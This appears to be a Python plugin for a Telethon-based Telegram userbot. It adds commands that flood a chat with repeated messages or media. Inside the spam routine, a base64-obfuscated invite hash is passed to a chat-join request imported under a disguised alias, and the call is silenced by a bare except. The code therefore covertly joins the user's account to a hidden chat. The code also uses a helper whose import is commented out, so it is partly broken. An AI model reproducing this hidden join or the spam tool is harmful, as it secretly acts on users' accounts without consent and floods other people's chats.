import asyncio
import base64
from telethon.tl import functions, types
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
#from plugins.helpers import _rozutils
from jmthon import jmthon

@jmthon.on(events.NewMessage(outgoing=True, pattern="^.تكرار (.*)"))
async def spammer(event):
    jasem = await event.get_reply_message()
    roz = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(roz[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, jasem, roz, sleeptimem, sleeptimet)



@jmthon.on(events.NewMessage(outgoing=True, pattern="^.مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    roz = input_str[1:]
    await event.delete()
    await spam_function(event, reply, roz, sleeptimem, sleeptimet, DelaySpam=True)
  
async def spam_function(event, jasem, roz, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    counter = int(roz[0])
    if len(roz) == 2:
        spam_message = str(roz[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await jasem.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and jasem.media:
        for _ in range(counter):
            jasem = await event.client.send_file(
                event.chat_id, jasem, caption=jasem.text
            )
            await _rozutils.unsavegif(event, jasem)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and jasem.text:
        spam_message = jasem.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
